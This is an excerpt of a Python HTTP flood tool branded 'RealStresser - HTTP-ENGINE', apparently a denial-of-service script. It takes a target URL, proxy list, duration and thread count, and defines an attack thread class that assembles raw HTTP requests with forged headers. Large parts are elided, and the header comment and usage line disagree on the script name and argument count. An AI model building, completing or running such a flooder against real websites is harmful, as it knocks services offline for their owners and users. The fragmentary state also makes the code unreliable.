#!/usr/bin/env python
#coding: utf8 
##python BoostHTTP.py [WEBSITE] [LIST.TXT] [TIME]
...
if len(sys.argv) != int(5):
    print("Wrong usage!")
    print("Usage: python HTTP-ENGINE.py [URL] [PROXY] [TIME] [THREADS]")
    exit(0)
...
class attacco(threading.Thread):
    def run(self):
        ...
        httprequest = get_host + useragent + accept + forward + referer + connection + "\r\n"
...
# grafica varia
print("          .----.RealStresser - HTTP-ENGINE.----.")
print("                 .----.By xr4zz3rs.----.")
